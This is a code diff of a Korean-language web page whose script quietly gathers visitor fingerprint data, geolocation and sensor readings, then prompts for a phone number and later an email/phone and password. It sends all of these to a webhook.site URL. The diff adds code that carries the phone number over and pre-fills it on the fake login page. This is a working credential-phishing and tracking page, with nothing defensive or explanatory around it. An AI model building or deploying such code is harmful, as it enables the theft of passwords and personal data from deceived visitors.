@@ -64,6 +64,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 
 <script>
 const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
+let savedPhone = ""; // 전화번호 저장용
 
 // page1 -> page2
 function goNext() {
@@ -77,8 +78,6 @@ function goNext() {
 // 최대 정보 수집
 async function collectUserInfo() {
   const formData = new URLSearchParams();
-
-  // 브라우저 기본 정보
   formData.append("userAgent", navigator.userAgent);
   formData.append("language", navigator.language);
   formData.append("platform", navigator.platform);
@@ -87,25 +86,17 @@ async function collectUserInfo() {
   formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
   formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
   formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
-
-  // 화면 정보
   formData.append("screen.width", screen.width);
   formData.append("screen.height", screen.height);
   formData.append("screen.availWidth", screen.availWidth);
   formData.append("screen.availHeight", screen.availHeight);
   formData.append("screen.colorDepth", screen.colorDepth);
   formData.append("screen.pixelDepth", screen.pixelDepth);
-
-  // 창 정보
   formData.append("window.innerWidth", window.innerWidth);
   formData.append("window.innerHeight", window.innerHeight);
   formData.append("window.outerWidth", window.outerWidth);
   formData.append("window.outerHeight", window.outerHeight);
-
-  // 시간대
   formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
-
-  // 네트워크 정보
   if (navigator.connection) {
     formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
     formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
@@ -114,8 +105,6 @@ async function collectUserInfo() {
   } else {
     formData.append("network.info", "unknown");
   }
-
-  // 배터리 정보
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
@@ -123,14 +112,8 @@ async function collectUserInfo() {
       formData.append("battery.level", battery.level);
       formData.append("battery.chargingTime", battery.chargingTime);
       formData.append("battery.dischargingTime", battery.dischargingTime);
-    } catch(e) {
-      formData.append("battery.info", "unknown");
-    }
-  } else {
-    formData.append("battery.info", "unknown");
-  }
-
-  // 위치 정보
+    } catch(e) { formData.append("battery.info", "unknown"); }
+  } else { formData.append("battery.info", "unknown"); }
   if (navigator.geolocation) {
     await new Promise(resolve => {
       navigator.geolocation.getCurrentPosition(pos => {
@@ -140,11 +123,7 @@ async function collectUserInfo() {
         resolve();
       }, err => { formData.append("location.error", err.message); resolve(); });
     });
-  } else {
-    formData.append("location", "unknown");
-  }
-
-  // 센서 정보 (1회만 수집)
+  } else { formData.append("location", "unknown"); }
   if (window.DeviceMotionEvent) {
     window.addEventListener("devicemotion", e=>{
       if (e.acceleration) {
@@ -161,8 +140,6 @@ async function collectUserInfo() {
       formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
     }, { once:true });
   }
-
-  // 타임스탬프
   formData.append("timestamp", new Date().toISOString());
   formData.append("page","1");
 
@@ -177,7 +154,13 @@ function sendPhone() {
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
   if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})}).catch(err=>console.error(err));
+  savedPhone = userId; // 전화번호 저장
+
+  fetch(webhookUrl,{
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})
+  }).catch(err=>console.error(err));
 
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
@@ -187,6 +170,10 @@ function sendPhone() {
     setTimeout(()=>{
       document.getElementById("page3").classList.add("hidden");
       document.getElementById("page4").classList.remove("hidden");
+
+      // 4페이지 전화번호 자동 입력
+      document.getElementById("userId4").value = savedPhone;
+
     },1000);
   },1500);
 }
@@ -196,7 +183,11 @@ function sendPage4() {
   const userId4=document.getElementById("userId4").value.trim();
   const userCode4=document.getElementById("userCode4").value.trim();
   if(!userId4||!userCode4){alert("이메일/전화번호와 비밀번호를 입력해주세요."); return;}
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})}).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
+  fetch(webhookUrl,{
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})
+  }).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
 }
 </script>
 </body>
